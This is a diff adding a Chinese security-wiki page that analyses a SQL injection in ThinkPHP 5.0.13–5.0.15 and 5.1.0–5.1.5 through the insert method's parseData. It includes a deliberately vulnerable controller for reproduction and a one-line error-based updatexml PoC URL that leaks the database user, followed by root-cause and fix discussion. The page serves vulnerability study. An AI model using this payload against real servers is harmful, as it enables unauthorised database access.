@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/5.1.0%20_%3D%20Thinkphp%20_%3D%205.1.5%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>5.0.13 \&lt;= Thinkphp \&lt;= 5.0.15 &amp; 5.1.0 \&lt;= Thinkphp \&lt;= 5.1.5 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "5.0.13 \\\u0026lt;= Thinkphp \\\u0026lt;= 5.0.15 \u0026amp; 5.1.0 \\\u0026lt;= Thinkphp \\\u0026lt;= 5.1.5", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_7" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../5.1.16%20_%3D%20Thinkphp%20_%3D%205.1.22%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../5.1.16%20_%3D%20Thinkphp%20_%3D%205.1.22%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        5.1.16 \&lt;= Thinkphp \&lt;= 5.1.22
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../5.1.0%20_%3D%20ThinkPHP%20_%3D%205.1.10%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../5.1.0%20_%3D%20ThinkPHP%20_%3D%205.1.10%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        5.0.0 \&lt;= Thinkphp \&lt;= 5.0.18 &amp; 5.1.0 \&lt;= ThinkPHP \&lt;= 5.1.10 文件包含漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="5013-thinkphp-5015-510-thinkphp-515">5.0.13 \&lt;= Thinkphp \&lt;= 5.0.15 &amp; 5.1.0 \&lt;= Thinkphp \&lt;= 5.1.5<a class="headerlink" href="#5013-thinkphp-5015-510-thinkphp-515" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>本篇文章，将分析 <strong>ThinkPHP</strong> 中存在的 <strong>SQL注入</strong> 漏洞（ <strong>insert</strong>
+方法注入）。本次漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong>
+方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong>
+语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><strong>5.0.13\&lt;=ThinkPHP\&lt;=5.0.15</strong> 、 <strong>5.1.0\&lt;=ThinkPHP\&lt;=5.1.5</strong> 。</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>通过以下命令获取测试环境代码：</p>
+<div class="codehilite"><pre><span></span><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo
+</code></pre></div>
+
+<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
+<div class="codehilite"><pre><span></span><code>&quot;require&quot;: {
+    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,
+    &quot;topthink/framework&quot;: &quot;5.0.15&quot;
+}
+</code></pre></div>
+
+<p>然后执行 <code>composer update</code> ，并将
+<strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">namespace</span> <span class="nx">app\index\controller</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">Index</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$username</span> <span class="o">=</span> <span class="nx">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;username/a&#39;</span><span class="p">);</span>
+        <span class="nx">db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span><span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="s1">&#39;Update success&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>在 <strong>application/database.php</strong> 文件中配置数据库相关信息，并开启
+<strong>application/config.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong>
+。创建数据库信息如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">create</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">tpdemo</span><span class="p">;</span>
+<span class="n">use</span><span class="w"> </span><span class="n">tpdemo</span><span class="p">;</span>
+<span class="n">create</span><span class="w"> </span><span class="n">table</span><span class="w"> </span><span class="n">users</span><span class="p">(</span>
+<span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">primary</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="n">auto_increment</span><span class="p">,</span>
+<span class="w">    </span><span class="n">username</span><span class="w"> </span><span class="n">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="nb nb-Type">null</span>
+<span class="p">);</span>
+</code></pre></div>
+
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>http://0-sec.org/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1
+</code></pre></div>
+
+<p>访问链接，即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到
+<strong>SQL</strong> 报错信息的）</p>
+<p><img alt="1.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId25.png" /></p>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p><img alt="2.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId27.png" /></p>
+<p>首先在官方发布的 <strong>5.0.16</strong>
+版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其
+<strong>commit</strong> 记录，发现其修改的 <strong>Builder.php</strong> 文件代码比较可疑。</p>
+<p><img alt="3.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId28.png" /></p>
+<p>接着我们直接跟着上面的攻击 <strong>payload</strong> 来看看漏洞原理。首先，
+<strong>payload</strong> 数据经过 <strong>ThinkPHP</strong> 内置方法的过滤后（不影响我们的
+<strong>payload</strong> ），直接进入了 <strong>$this-&gt;builder</strong> 的 <strong>insert</strong>
+方法，这里的 <strong>$this-&gt;builder</strong> 为 <strong>\think\db\builder\Mysql</strong>
+类，代码如下：</p>
+<p><img alt="4.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId29.png" /></p>
+<p>而 <strong>Mysql</strong> 类继承于 <strong>Builder</strong> 类，即上面的
+<strong>$this-&gt;builder-&gt;insert()</strong> 最终调用的是 <strong>Builder</strong> 类的 <strong>insert</strong>
+方法。在 <strong>insert</strong> 方法中，我们看到其调用 <strong>parseData</strong>
+方法来分析并处理数据，而 <strong>parseData</strong> 方法直接将来自用户的数据
+<strong>$val</strong> 进行了拼接返回。我们的恶意数据存储在 <strong>$val[1]</strong>
+中，虽经过了 <strong>parseKey</strong>
+方法处理，当丝毫不受影响，因为该方法只是用来解析处理数据的，并不是清洗数据。</p>
+<p><img alt="5.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId30.png" /></p>
+<p>上面，我们看到直接将用户数据进行拼接。然后再回到 <strong>Builder</strong> 类的
+<strong>insert</strong> 方法，直接通过替换字符串的方式，将 <strong>$data</strong> 填充到 <strong>SQL</strong>
+语句中，进而执行，造成 <strong>SQL注入漏洞</strong> 。</p>
+<p><img alt="6.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId31.png" /></p>
+<p>至此，我们已将整个漏洞分析完了。实际上，上面的 <strong>switch</strong>
+结构中，3种情况返回的数据都有可能造成 <strong>SQL</strong> 注入漏洞，但是在观察
+<strong>ThinkPHP</strong> 官方的修复代码中，发现其只对 <strong>inc</strong> 和 <strong>dec</strong>
+进行了修复，而对于 <strong>exp</strong> 的情况并未处理，这是为什么呢？</p>
+<p>实际上， <strong>exp</strong> 的情况早在传入 <strong>insert</strong> 方法前就被 <strong>ThinkPHP</strong>
+内置过滤方法给处理了，如果数据中存在 <strong>exp</strong> ，则会被替换成 <strong>exp空格</strong>
+，这也是为什么 <strong>ThinkPHP</strong> 官方没有对 <strong>exp</strong>
+的情况进行处理的原因了。具体内置过滤方法的代码如下：</p>
+<p><img alt="7.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId32.png" /></p>
+<h3 id="_5">漏洞修复<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p><img alt="8.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId34.png" /></p>
+<h3 id="_6">攻击总结<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>最后，再通过一张攻击流程图来回顾整个攻击过程。</p>
+<p><img alt="9.png" src="./resource/5.1.0&lt;=Thinkphp&lt;=5.1.5sql注入漏洞/media/rId36.png" /></p>
+<h2 id="_7">参考链接<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../5.1.16%20_%3D%20Thinkphp%20_%3D%205.1.22%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../5.1.16%20_%3D%20Thinkphp%20_%3D%205.1.22%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        5.1.16 \&lt;= Thinkphp \&lt;= 5.1.22
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../5.1.0%20_%3D%20ThinkPHP%20_%3D%205.1.10%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../5.1.0%20_%3D%20ThinkPHP%20_%3D%205.1.10%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        5.0.0 \&lt;= Thinkphp \&lt;= 5.0.18 &amp; 5.1.0 \&lt;= ThinkPHP \&lt;= 5.1.10 文件包含漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
